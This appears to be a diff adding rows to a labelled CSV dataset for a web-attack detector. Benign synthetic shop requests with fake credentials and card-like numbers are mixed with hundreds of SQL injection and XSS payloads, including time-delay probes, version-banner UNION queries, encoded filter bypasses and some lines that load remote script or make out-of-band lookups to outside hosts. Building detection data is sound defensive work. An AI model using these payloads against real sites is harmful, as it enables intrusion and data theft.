+1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--,sqli
+miembros/index.jsp,benign
+X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >,xss
+"admin"" or 1=1--",sqli
+"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",xss
+"<a href=""\x10javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+a' order by 9999-- #,sqli
+"ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(1)"">DEF",xss
+"no)UE: select * from users where id=1 + ($+) union select null,@@VERSION -- 1",sqli
+imagenes/nuestratierra.jpg,benign
+"UEvo,: select * from users where id=1 union select @<@,version() -- 1",sqli
+"voUEv: select * from users where id=1 -@<@ union select null,version() -- 1",sqli
+"""/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />",xss
+"<IMG onmouseover=""alert('xxs')"">",xss
+"so;s: select * from users where id=1 or ""%;"" or 1=1 -- 1",sqli
+elsen@whitehat.td,benign
+publico/autenticar.jsp?modo=entrar&login=kesling8&pwd=g8629e8d9r&remember=off&B1=Entrar,benign
+peng1in,benign
+"a""and/*g*/456=678-- #",sqli
+"<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>",xss
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,xss
+"c/ tamesis 39, 1?c",benign
+"s,c: select * from users where id=1 or "",#"" or 1=1 -- 1",sqli
+2.56E+15,benign
+adoree-halsted1@estoespresto.af,benign
+"<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<img src\x12=x onerror=""javascript:alert(1)"">",xss
+admin') or ('1'='1'--,sqli
+17889538t,benign
+miembros/salir.jsp,benign
+"`""'><img src=xxx:x \x20onerror=javascript:alert(1)>",xss
+dierkop@hayunmundoahifuera.id,benign
+<iframe/src \/\/onload = prompt(1),xss
+<svg><script>//&NewLine;confirm(1);</script </svg>,xss
+"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",xss
+miembros/index.jsp,benign
+"s?s: select * from users where id='1' union select ""?""_,version() -- 1'",sqli
+"`""'><img src='#\x27 onerror=javascript:alert(1)>",xss
+"UE1n,: select * from users where id=1 union select .1_,version() -- 1",sqli
+07485924e,benign
+"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
+cele959n3s0o,benign
+"s1UE1: select * from users where id=1 or 1#""1 union select 1,version() -- 1",sqli
+"""`'><script>\xC2\x85javascript:alert(1)</script>",xss
+<script itworksinallbrowsers>/*<script* */alert(1)</script,xss
+publico/caracteristicas.jsp?id=2,benign
+<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>,xss
+"o..UE: select * from users where id=1<@.. union select 1,version() -- 1",sqli
+publico/vaciar.jsp?B2=Vaciar+carrito,benign
+"s:UE1: select * from users where id=1 or 1#"": union select 1,version() -- 1",sqli
+<script\x00>javascript:alert(1)</script>,xss
+?revivir,benign
+publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
+"""/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />",xss
+3.20E+15,benign
+70679983v,benign
+<// style=x:expression\28javascript:alert(1)\29>,xss
+"<div id=d><div style=""font-family:'sans\27\3B color\3Ared\3B'"">X</div></div> <script>with(document.getElementById(""d""))innerHTML=innerHTML</script>",xss
+<script>javascript:alert(1)</script\x0D,xss
+<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x,xss
+"s,;s: select * from users where id=1 or "",;"" or 1=1 -- 1",sqli
+^,sqli
+s&1c: select * from users where id='1'   or 1=1 -- 1',sqli
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,xss
+o1&1c: select * from users where id=1 *1 or 1=1 -- 1,sqli
+"s;.s: select * from users where id=1 or "";.""=1 or 1=1 -- 1",sqli
+"<BR SIZE=""&{alert('XSS')}"">",xss
+"s(;s: select * from users where id=1 or ""(;"" or 1=1 -- 1",sqli
+"s,{s: select * from users where id=1 or "",{"" or 1=1 -- 1",sqli
+publico/autenticar.jsp?modo=entrar&login=marge&pwd=g1ne136&remember=on&B1=Entrar,benign
+"s{?s: select * from users where id=1 or ""{?"" or 1=1 -- 1",sqli
+"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
+"<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"admin"" or 1=1",sqli
+"1UEvk: select * from users where id=1 +1 union select null,banner from v$version where rownum=1 -- 1",sqli
+&(n&1: select * from users where id=1 or ($+)=1 or 1=1 -- 1,sqli
+47965007w,benign
+"<input type=""text"" value=``<div/onmouseover='alert(1)'>X</div>",xss
+longhurst-street1@drae2.pa,benign
+sant vicen de torell,benign
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,xss
+90230020p,benign
+"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",xss
+"<object src=1 href=1 onerror=""javascript:alert(1)""></object>",xss
+publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=63&B1=A%F1adir+al+carrito,benign
+miembros/imagenes/castro.jpg,benign
+global/creditos.jsp,benign
+publico/miembros.jsp,benign
+miembros/fotos.jsp,benign
+"<image src=1 href=1 onerror=""javascript:alert(1)""></image>",xss
+"o()UE: select * from users where id=1 *(\) union select null,@@VERSION -- 1",sqli
+"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
+"so(s: select * from users where id=1 or ""&("" or 1=1 -- 1",sqli
+"UE11n: select * from users where id=1 union select 1 1a,version() -- 1",sqli
+"<img src=x\x11onerror=""javascript:alert(1)"">",xss
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
+2 and 456=678,sqli
+"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss
+"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",xss
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,xss
+"<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+" <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
+"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
+publico/autenticar.jsp?modo=entrar&login=monette&pwd=1ob20h9la3&remember=off&B1=Entrar,benign
+"<A HREF=""http://66.102.7.147/"">XSS</A>",xss
+7.87E+15,benign
+"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",xss
+"&noon: select * from users where id=1 or $+<$ union select 1,@@VERSION -- 1",sqli
+"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>​",xss
+"s,UEv: select * from users where id=1 or 1#"", union select null,version() -- 1",sqli
+imagenes/logo.gif,benign
+"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",xss
+"o1nUE: select * from users where id=1 <@1$ union select 1,version() -- 1",sqli
+global/creditos.jsp,benign
+"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",xss
+"s,?s: select * from users where id=1 or "",?"" or 1=1 -- 1",sqli
+"sUEo,: select * from users where id='1' union select +\,@@VERSION -- 1'",sqli
+"""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",xss
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,xss
+2 or 345=345,sqli
+"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",xss
+"<a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""javascript:alert(1);"">XXX</a></a><a href=""javascript:javascript:alert(1)"">XXX</a>",xss
+1')); waitfor delay '0:0:X'--,sqli
+"<object data=""data:text/html;base64,%(base64)s"">",xss
+"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
+publico/pagar.jsp?modo=insertar&precio=3027&B1=Confirmar,benign
+4089,benign
+"<a href=""javascript\x00:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+57584234p,benign
+noon&: select * from users where id=1 + $+%$ or 1=1 -- 1,sqli
+1'; waitfor delay '0:0:X'--,sqli
+"s)?s: select * from users where id=1 or "")]"" or 1=1 -- 1",sqli
+"s){s: select * from users where id=1 or ""){"" or 1=1 -- 1",sqli
+"s(UEv: select * from users where id=1 or 1#""( union select null,version() -- 1",sqli
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
+publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
+<%<!--'%><script>alert(1);</script -->,xss
+publico/registro.jsp?modo=registro&login=ftpsites&password=t0t0&nombre=Alfio&apellidos=Potel+Ivars&email=storgaard-szibo3%40elreversotenebroso.ky&dni=17889538T&direccion=Diogenes+82%2C+&ciudad=Ag%F3n&cp=47450&provincia=Guadalajara&ntc=8851191771150286&B1=Registrar,benign
+<script x> alert(1) </script 1=2,xss
+arraia-maeztu,benign
+"<img src=x\x12onerror=""javascript:alert(1)"">",xss
+"UE111: select * from users where id=1 union select 1 1$,version() -- 1",sqli
+"s(?s: select * from users where id=1 or ""(]"" or 1=1 -- 1",sqli
+"<STYLE>li {list-style-image: url(""javascript:javascript:alert(1)"");}</STYLE><UL><LI>XSS",xss
+81383348x,benign
+publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=41&B1=A%F1adir+al+carrito,benign
+"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",xss
+9.55E+15,benign
+"<img src=x onerror=\x11""javascript:alert(1)"">",xss
+"<meta charset= ""x-imap4-modified-utf7""&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>",xss
+"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
+<title onpropertychange=javascript:alert(1)></title><title title=>,xss
+"svos: select * from users where id=1 or ""@%"" or 1=1 -- 1",sqli
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>,xss
+".oUEv: select * from users where id=1.*\ union select null,@@VERSION -- 1",sqli
+andrs castanyer,benign
+"s.:s: select * from users where id=1 or "".:""=1 or 1=1 -- 1",sqli
+"o.UEv: select * from users where id=1 *\. union select null,@@VERSION -- 1",sqli
+"1)) or benchmark(100000000,MD5(1))#",sqli
+imagenes/cmenbul.gif,benign
+ansorger,benign
+trombn,benign
+"s?,s: select * from users where id=1 or ""?,"" or 1=1 -- 1",sqli
+"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(1)"");}</STYLE><A CLASS=XSS></A>",xss
+"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",xss
+<svg><script>//&NewLine;confirm(1);</script </svg>,xss
+a' or '345'='345,sqli
+"<IMG SRC=""javascript:javascript:alert(1)""",xss
+"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",xss
+"snos: select * from users where id=1 or ""$&"" or 1=1 -- 1",sqli
+publico/registro.jsp?modo=registro&login=calleja&password=fermentadora&nombre=Lahuen&apellidos=Palau+Ustrell&email=baxley%40italianmotorvillagesevilla.sh&dni=01084400L&direccion=Plaza+Aparejador+Federico+Bermudez+139%2C+&ciudad=Orce&cp=18129&provincia=Vizcaya&ntc=1769642985963078&B1=Registrar,benign
+imagenes/3.gif,benign
+"<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+global/titulo.jsp,benign
+elois,benign
+"soonU: select * from users where id='1' + $+*$ union select 1,@@VERSION -- 1'",sqli
+<iframe/onreadystatechange=alert(1),xss
+"&oo1U: select * from users where id=1 or \< =1 union select 1,@@VERSION -- 1",sqli
+"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
+"s(:s: select * from users where id=1 or ""(:"" or 1=1 -- 1",sqli
+publico/productos.jsp,benign
+"ABC<div style=""x:\xE2\x80\x89expression(javascript:alert(1)"">DEF",xss
+imagenes/cmenbul.gif,benign
+"s,)s: select * from users where id=1 or "",)""=1 or 1=1 -- 1",sqli
+publico/carrito.jsp,benign
+trebaol@arroyomolinos-madrid.gq,benign
+<style>*[{}@import'%(css)s?]</style>X,xss
+imagenes/cmenbul.gif,benign
+"<a href=""javascript\x3A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+2/1 or 345=345,sqli
+"&nooU: select * from users where id=1 or $+<\ union select 1,@@VERSION -- 1",sqli
+"admin"" or 1=1#",sqli
+22010612a,benign
+"UE1o.: select * from users where id=1 union select 1<@.,version() -- 1",sqli
+"&oUE1: select * from users where id=1 or \<\ union select 1,@@VERSION -- 1",sqli
+"s;UEs: select * from users where id=1 or 1#""; union select 'a',version() -- 1",sqli
+baigent@blueberryminiloaf.com.dj,benign
+"s(UE1: select * from users where id=1 or 1#""( union select 1,version() -- 1",sqli
+"on.UE: select * from users where id=1 *$ . union select null,@@VERSION -- 1",sqli
+"<a href=""\x1Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>",xss
+tejeda y segoyuela,benign
+ferne,benign
+1; waitfor delay '0:0:X'--,sqli
+"<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>",xss
+publico/pagar.jsp?modo=insertar&precio=119&B1=Pasar+por+caja,benign
+"<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>",xss
+admin') or ('1'='1,sqli
+"ooUEv: select * from users where id=1 <@<@ union select null,version() -- 1",sqli
+"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",xss
+soo1&: select * from users where id='1' <@&1 or 1=1 -- 1',sqli
+<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,xss
+miembros/editar.jsp?modo=registro&login=maurie&password=0StroP5je0&nombre=Vlentina&apellidos=Fisas&email=marlaud_losee5%40redesmilitantes.tf&dni=54430634F&direccion=Viseu+81+8%3FC&ciudad=Corbera+d%27Ebre&cp=48210&provincia=Murcia&ntc=4713791605534130&B1=Registrar,benign
+1)); waitfor delay '0:0:X'--,sqli
+imagenes/3.gif,benign
+<form><button formaction=javascript&colon;alert(1)>CLICKME,xss
+<script>javascript:alert(1)</script\x0B,xss
+6.80E+13,benign
+<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
+adelina,benign
+"s).s: select * from users where id=1 or "").""=1 or 1=1 -- 1",sqli
+reencarnar,benign
+"s{UEv: select * from users where id=1 or 1#""{ union select null,version() -- 1",sqli
+"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
+"s{UEf: select * from users where id=1 or 1#""{ union select version(),version() -- 1",sqli
+"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",xss
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
+"onnUE: select * from users where id=1 <@$_ union select 1,version() -- 1",sqli
+publico/caracteristicas.jsp?id=1,benign
+publico/caracteristicas.jsp?id=2,benign
+"""`'><script>\xE2\x80\xA8javascript:alert(1)</script>",xss
+"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",xss
+"on1UE: select * from users where id=1 %$ 1 union select null,@@VERSION -- 1",sqli
+21292,benign
+son.&: select * from users where id='1' *$ . or 1=1 -- 1',sqli
+global/titulo.jsp,benign
+92251391r,benign
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss
+publico/registro.jsp?modo=registro&login=zinkie0&password=9i3a&nombre=Esteban&apellidos=Delvalle+Llers&email=luxford_baumann%40lasiestacreativa.tel&dni=47651101T&direccion=Calle+Espiel+71+&ciudad=Rab%F3s&cp=45634&provincia=Zaragoza&ntc=8349635911694626&B1=Registrar,benign
+"admin"") or (""1""=""1""/*",sqli
+"<img \x00src=x onerror=""javascript:alert(1)"">",xss
+genestar llufriu,benign
+segu san marful,benign
+"<a href=""\xE2\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss
+"UE1f(: select * from users where id=1 union select 1<@$,version() -- 1",sqli
+"so,s: select * from users where id=1 or ""%,"" or 1=1 -- 1",sqli
+"s1(s: select * from users where id=1 or ""1(""=1 or 1=1 -- 1",sqli
+admin') or '1'='1'#,sqli
+publico/autenticar.jsp?modo=entrar&login=marlowe&pwd=gavota&remember=on&B1=Entrar,benign
+"&()o1: select * from users where id=1 or (\)=1 union select 1,@@VERSION -- 1",sqli
+"<a href=""javas\x0Dcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",xss
+"s;s: select * from users where id='1' union select "";""_,version() -- 1'",sqli
+"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",xss
+publico/registro.jsp?modo=registro&login=leshowit&password=eflujo&nombre=Solania&apellidos=Argim%F3n&email=benfield%40chuecafamily.gs&dni=67663365X&direccion=Plaza+Ignacio+Mercader+77+&ciudad=Coru%F1a%2C+A&cp=42218&provincia=Burgos&ntc=4650446572677289&B1=Registrar,benign
+"s{{s: select * from users where id=1 or ""{{"" or 1=1 -- 1",sqli
+miembros/imagenes/ogono.jpg,benign
+s&no&: select * from users where id='1' or $<\ or 1=1 -- 1',sqli
+"s?)s: select * from users where id=1 or ""])"" or 1=1 -- 1",sqli
+soon&: select * from users where id='1' + $+%$ or 1=1 -- 1',sqli
+18567,benign
+"""`'><script>\x0Bjavascript:alert(1)</script>",xss
+"sUEvk: select * from users where id='1'   union select null,banner from v$version where rownum=1 -- 1'",sqli
+publico/pagar.jsp?modo=insertar&precio=6534&B1=Confirmar,benign
+"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"sUEv1: select * from users where id='1' union select @ 1,version() --  1'",sqli
+"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss
+26527823z,benign
+"<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>",xss
+"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss
+publico/caracteristicas.jsp?id=1,benign
+"ABC<div style=""x:\xEF\xBB\xBFexpression(javascript:alert(1)"">DEF",xss
+miembros/imagenes/zarauz.jpg,benign
+monopolizador,benign
+"son.U: select * from users where id='1' + $ . union select 1,@@VERSION -- 1'",sqli
+publico/pagar.jsp?modo=insertar&precio=7626&B1=Confirmar,benign
+"s.o1&: select * from users where id=1 or @#"".=1 or 1=1 -- 1",sqli
+or 1=1,sqli
+"s,,s: select * from users where id=1 or "",,""=1 or 1=1 -- 1",sqli
+global/creditos.jsp,benign
+" or ""&",sqli
+"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out",xss
+"s&&o1: select * from users where id='1' or ||/1=1 union select 1,version() -- 1'",sqli
+<svg><script onlypossibleinopera:-)> alert(1),xss
+on.&1: select * from users where id=1 %$ . or 1=1 -- 1,sqli
+"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<img src=""x` `<script>javascript:alert(1)</script>""` `>",xss
+http://www.<script>alert(1)</script .com,xss
+imagenes/logo.gif,benign
+"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
+"s;o1U: select * from users where id=1 or 1#"";=1 union select 1,version() -- 1",sqli
+miembros/imagenes/zarauz.jpg,benign
+conciliador,benign
+dey,benign
+publico/pagar.jsp?modo=insertar&precio=2161&B1=Pasar+por+caja,benign
+admin' or '1'='1'--,sqli
+global/creditos.jsp,benign
+publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=64&B1=A%F1adir+al+carrito,benign
+"admin"") or ""1""=""1",sqli
+"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",xss
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,xss
+"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",xss
+c/ david 169 6-h,benign
+"<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+pe7tr0b9,benign
+c/ atlantico 167,benign
+"s(o1&: select * from users where id=1 or @#""(=1 or 1=1 -- 1",sqli
+"nooUE: select * from users where id=1 + $+*\ union select null,@@VERSION -- 1",sqli
+kouraviev@socimi.com.gl,benign
+"sUEvv: select * from users where id='1' union select @ @1,version() --  1'",sqli
+"s.UEv: select * from users where id=1 or 1#"". union select null,version() -- 1",sqli
+publico/caracteristicas.jsp?id=2,benign
+<b <script>alert(1)</script>0,xss
+"&1oon: select * from users where id=1 or \+<$ union select 1,@@VERSION -- 1",sqli
+"1 or benchmark(100000000,MD5(1))#",sqli
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00,xss
+"<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"">",xss
+"'';!--""<XSS>=&{()}",xss
+"<script src=1 href=1 onerror=""javascript:alert(1)""></script>",xss
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,xss
+' or 'x'='x,sqli
+miembros/imagenes/ogono.jpg,benign
+shangtia,benign
+"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
+"<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",xss
+global/estilos.css,benign
+"<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",xss
+"s.;s: select * from users where id=1 or "".;"" or 1=1 -- 1",sqli
+<img src=`%00`&NewLine; onerror=alert(1)&NewLine;,xss
+"<img src=x onerror=\x10""javascript:alert(1)"">",xss
+"o1UE1: select * from users where id=1 *1 union select 1,banner from v$version where rownum=1 -- 1",sqli
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""%(htc)s""><xss:xss>XSS</xss:xss></HTML>"""""",""XML namespace.""),(""""""<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:javascript:alert(1)""&gt;</B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",xss
+"s.os: select * from users where id=1 or "".%"" or 1=1 -- 1",sqli
+"""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",xss
+"s;{s: select * from users where id=1 or "";{"" or 1=1 -- 1",sqli
+"""`'><script>\xE2\x80\x86javascript:alert(1)</script>",xss
+"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
+"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>​",xss
+"sUE.c: select * from users where id='1' union select \.#,@@VERSION -- 1'",sqli
+"s:ns: select * from users where id=1 or "":$"" or 1=1 -- 1",sqli
+"UE11f: select * from users where id=1 union select 1 $,version() -- 1",sqli
+rgiva,benign
+5123,benign
+publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=36&B1=A%F1adir+al+carrito,benign
+publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=91&B1=A%F1adir+al+carrito,benign
+jara escobedo,benign
+<svg/onload=alert(1),xss
+"<img src\x09=x onerror=""javascript:alert(1)"">",xss
+index.jsp,benign
+<frameset onload=javascript:alert(1)>,xss
+gayol,benign
+"marines, los",benign
+"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF ",xss
+"345""%5d|//*|/a%5b""a",sqli
+di lorenzo,benign
+"<style>@import ""data:,*%7bx:expression(javascript:alert(1))%7D"";</style>",xss
+houstin@maxitienda.zr,benign
+amorebieta-etxano,benign
+2/*f*/or/*f*/345=345,sqli
+") or (x"")=(""x",sqli
+"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",xss
+"&no.U: select * from users where id=1 or $<\. union select 1,@@VERSION -- 1",sqli
+"s1os: select * from users where id=1 or ""1&"" or 1=1 -- 1",sqli
+"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
+"UEv1f: select * from users where id=1 union select  @ $,version() -- 1",sqli
+diezma,benign
+"ooUEf: select * from users where id=1 <@<@ union select version(),version() -- 1",sqli
+8.85E+15,benign
+<script src=%(jscript)s></script>,xss
+"sUE1n: select * from users where id='1' union select 1a,banner from v$version where rownum=1 -- 1'",sqli
+"s&.oU: select * from users where id='1' or \.<\ union select 1,@@VERSION -- 1'",sqli
+"sUEo.: select * from users where id='1' union select +\.,@@VERSION -- 1'",sqli
+"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",xss
+"""`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>",xss
+"svUE1: select * from users where id=1 or 1#""@ union select 1,version() -- 1",sqli
+"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss
+a' or '345'='345,sqli
+"<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
+"<a href=""javascript\x09:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"plaa del mercat, 198 7-c",benign
+"s&.o1: select * from users where id='1' or \.<1 union select 1,@@VERSION -- 1'",sqli
+<img src ?itworksonchrome?\/onerror = alert(1),xss
+miembros/salir.jsp,benign
+imagenes/logo.gif,benign
+ezequas,benign
+"<a href=""\xE2\x80\x84javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<img \x12src=x onerror=""javascript:alert(1)"">",xss
+eddier,benign
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,xss
+global/creditos.jsp,benign
+&oo1&: select * from users where id=1 or \< =1 or 1=1 -- 1,sqli
+<script ~~~>alert(0%0)</script ~~~>,xss
+63829565b,benign
+publico/registro.jsp?modo=registro&login=mollerus&password=1capa2ad*or&nombre=Jorgelina&apellidos=Romanov+Xandri&email=bonyadi-pedro%40programa-gestion-erp.bv&dni=20914276P&direccion=Masia+Can+Giro%2C+5+&ciudad=Puente+del+Congosto&cp=33776&provincia=Lleida&ntc=0332806980099354&B1=Registrar,benign
+"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss
+".o1c: select * from users where id=1.<1# union select 1,version() -- 1",sqli
+".&1UE: select * from users where id=1.&&1 union select 1,version() -- 1",sqli
+"<a href=""\x1Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"s(UEs: select * from users where id=1 or 1#""( union select 'a',version() -- 1",sqli
+" or "" ",sqli
+ov&1c: select * from users where id=1 &@ or 1=1 -- 1,sqli
